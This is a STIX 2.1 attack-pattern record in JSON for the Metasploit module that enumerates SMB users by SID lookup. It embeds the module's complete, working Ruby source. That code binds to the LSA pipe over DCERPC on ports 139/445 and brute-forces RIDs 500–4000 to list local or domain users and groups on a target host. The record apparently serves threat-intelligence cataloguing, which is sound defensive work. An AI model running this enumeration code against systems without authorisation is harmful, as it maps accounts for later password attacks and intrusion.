{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--294df52f-1ae4-48a9-843b-951241e8254b",
    "created": "2024-08-14T16:31:17.839708Z",
    "modified": "2024-08-14T16:31:17.839712Z",
    "name": "SMB SID User Enumeration (LookupSid)",
    "description": "Determine what users exist via brute force SID lookups. This module can enumerate both local and domain accounts by setting ACTION to either LOCAL or DOMAIN'",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/smb/smb_lookupsid.rb",
            "external_id": "smb_lookupsid.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  # Exploit mixins should be called first\n  include Msf::Exploit::Remote::SMB::Client\n  include Msf::Exploit::Remote::SMB::Client::Authenticated\n\n  include Msf::Exploit::Remote::DCERPC\n\n  # Scanner mixin should be near last\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'        => 'SMB SID User Enumeration (LookupSid)',\n      'Description' => 'Determine what users exist via brute force SID lookups.\n        This module can enumerate both local and domain accounts by setting\n        ACTION to either LOCAL or DOMAIN',\n      'Author'      => 'hdm',\n      'License'     => MSF_LICENSE,\n      'DefaultOptions' =>\n        {\n          # Samba doesn't like this option, so we disable so we are compatible with\n          # both Windows and Samba for enumeration.\n          'DCERPC::fake_bind_multi' => false\n        },\n      'Actions'     =>\n        [\n          ['LOCAL', { 'Description' => 'Enumerate local accounts' } ],\n          ['DOMAIN', { 'Description' => 'Enumerate domain accounts' } ]\n        ],\n      'DefaultAction' => 'LOCAL'\n    )\n\n    register_options(\n      [\n        OptInt.new('MinRID', [ false, \"Starting RID to check\", 500 ]),\n        OptInt.new('MaxRID', [ false, \"Maximum RID to check\", 4000 ])\n      ],\n      self.class\n    )\n\n    deregister_options('RPORT')\n  end\n\n  # Constants used by this module\n  LSA_UUID     = '12345778-1234-abcd-ef00-0123456789ab'\n  LSA_VERS     = '0.0'\n  LSA_PIPES    = %W{ LSARPC NETLOGON SAMR BROWSER SRVSVC }\n\n  def rport\n    @rport || datastore['RPORT']\n  end\n\n  def smb_direct\n    @smbdirect || datastore['SMBDirect']\n  end\n\n  # Locate an available SMB PIPE for the specified service\n  def smb_find_dcerpc_pipe(uuid, vers, pipes)\n    found_pipe   = nil\n    found_handle = nil\n    pipes.each do |pipe_name|\n      connected = false\n      begin\n        connect\n        smb_login\n        connected = true\n\n        handle = dcerpc_handle(\n          uuid, vers,\n          'ncacn_np', [\"\\\\#{pipe_name}\"]\n        )\n\n        dcerpc_bind(handle)\n        return pipe_name\n\n      rescue ::Interrupt => e\n        raise e\n      rescue ::Exception => e\n        raise e if not connected\n      end\n      disconnect\n    end\n    nil\n  end\n\n  def smb_parse_sid(data)\n    fields = data.unpack('VvvvvVVVVV')\n    domain = data[32, fields[3]]\n    domain.gsub!(\"\\x00\", '')\n\n    if(fields[6] == 0)\n      return [nil, domain]\n    end\n\n    while(fields[3] % 4 != 0)\n      fields[3] += 1\n    end\n\n    buff = data[32 + fields[3], data.length].unpack('VCCvNVVVVV')\n    sid  = buff[4..8].map{|x| x.to_s }.join(\"-\")\n    return [sid, domain]\n  end\n\n  def smb_pack_sid(str)\n    [1,5,0].pack('CCv') + str.split('-').map{|x| x.to_i}.pack('NVVVV')\n  end\n\n  def smb_parse_sid_lookup(data)\n\n    fields = data.unpack('VVVVVvvVVVVV')\n    if(fields[0] == 0)\n      return nil\n    end\n\n    domain = data[44, fields[5]]\n    domain.gsub!(\"\\x00\", '')\n\n    while(fields[5] % 4 != 0)\n      fields[5] += 1\n    end\n\n    ginfo = data[44 + fields[5], data.length].unpack('VCCvNVVVV')\n    uinfo = data[72 + fields[5], data.length].unpack('VVVVvvVVVVV')\n\n    if(uinfo[3] == 8)\n      return [8, nil]\n    end\n\n    name = data[112 + fields[5], uinfo[4]]\n    name.gsub!(\"\\x00\", '')\n\n    [ uinfo[3], name ]\n  end\n\n  # Fingerprint a single host\n  def run_host(ip)\n    [[139, false], [445, true]].each do |info|\n\n    @rport = info[0]\n    @smbdirect = info[1]\n\n    lsa_pipe   = nil\n    lsa_handle = nil\n    begin\n      # find the lsarpc pipe\n      lsa_pipe = smb_find_dcerpc_pipe(LSA_UUID, LSA_VERS, LSA_PIPES)\n      break if not lsa_pipe\n\n      # OpenPolicy2()\n      stub =\n        NDR.uwstring(ip) +\n        NDR.long(24) +\n        NDR.long(0) +\n        NDR.long(0) +\n        NDR.long(0) +\n        NDR.long(0) +\n        NDR.long(rand(0x10000000)) +\n        NDR.long(12) +\n        [\n          2, # Impersonation\n          1, # Context\n          0  # Effective\n        ].pack('vCC') +\n        NDR.long(0x02000000)\n\n      dcerpc.call(44, stub)\n      resp = dcerpc.last_response ? dcerpc.last_response.stub_data : nil\n\n      if ! (resp and resp.length == 24)\n        print_error(\"Invalid response from the OpenPolicy request\")\n        disconnect\n        return\n      end\n\n      phandle = resp[0,20]\n      perror  = resp[20,4].unpack(\"V\")[0]\n\n      # Recent versions of Windows restrict this by default\n      if(perror == 0xc0000022)\n        disconnect\n        return\n      end\n\n      if(perror != 0)\n        print_error(\"Received error #{\"0x%.8x\" % perror} from the OpenPolicy2 request\")\n        disconnect\n        return\n      end\n\n      # QueryInfoPolicy(Local)\n      stub = phandle + NDR.long(5)\n      dcerpc.call(7, stub)\n      resp = dcerpc.last_response ? dcerpc.last_response.stub_data : nil\n      host_sid, host_name = smb_parse_sid(resp)\n\n      # QueryInfoPolicy(Domain)\n      stub = phandle + NDR.long(3)\n      dcerpc.call(7, stub)\n      resp = dcerpc.last_response ? dcerpc.last_response.stub_data : nil\n      domain_sid, domain_name = smb_parse_sid(resp)\n\n      # Store SID, local domain name, joined domain name\n      print_status(\"PIPE(#{lsa_pipe}) LOCAL(#{host_name} - #{host_sid}) DOMAIN(#{domain_name} - #{domain_sid})\")\n\n      domain = {\n        :name    => host_name,\n        :txt_sid => host_sid,\n        :users   => {},\n        :groups  => {}\n      }\n\n      target_sid = case action.name.upcase\n      when 'LOCAL'\n        host_sid\n      when 'DOMAIN'\n        # Fallthrough to the host SID if no domain SID was returned\n        unless domain_sid\n          print_error(\"No domain SID identified, falling back to the local SID...\")\n        end\n        domain_sid || host_sid\n      end\n\n      min_rid = datastore['MinRID']\n      # Brute force through a common RID range\n\n      min_rid.upto(datastore['MaxRID']) do |rid|\n\n        stub =\n          phandle +\n          NDR.long(1) +\n          NDR.long(rand(0x10000000)) +\n          NDR.long(1) +\n          NDR.long(rand(0x10000000)) +\n          NDR.long(5) +\n          smb_pack_sid(target_sid) +\n          NDR.long(rid) +\n          NDR.long(0) +\n          NDR.long(0) +\n          NDR.long(1) +\n          NDR.long(0)\n\n        dcerpc.call(15, stub)\n        resp = dcerpc.last_response ? dcerpc.last_response.stub_data : nil\n\n        # Skip the \"not mapped\" error message\n        if(resp and resp[-4,4].unpack(\"V\")[0] == 0xc0000073)\n          next\n        end\n\n        # Stop if we are seeing access denied\n        if(resp and resp[-4,4].unpack(\"V\")[0] == 0xc0000022)\n          break\n        end\n\n        utype,uname = smb_parse_sid_lookup(resp)\n        case utype\n        when 1\n          print_status(\"USER=#{uname} RID=#{rid}\")\n          domain[:users][rid] = uname\n        when 2\n          domain[:groups][rid] = uname\n          print_status(\"GROUP=#{uname} RID=#{rid}\")\n        else\n          print_status(\"TYPE=#{utype} NAME=#{uname} rid=#{rid}\")\n        end\n      end\n\n      # Store the domain information\n      report_note(\n        :host => ip,\n        :proto => 'tcp',\n        :port => rport,\n        :type => 'smb.domain.lookupsid',\n        :data => domain\n      )\n\n      print_status(\"#{domain[:name].upcase} [#{domain[:users].keys.map{|k| domain[:users][k]}.join(\", \")} ]\")\n      disconnect\n      return\n\n    rescue ::Timeout::Error\n    rescue ::Interrupt\n      raise $!\n    rescue ::Rex::ConnectionError\n    rescue ::Rex::Proto::SMB::Exceptions::LoginError\n      next\n    rescue ::Exception => e\n      print_line(\"Error: #{e.class} #{e}\")\n    end\n    end\n  end\nend\n"
}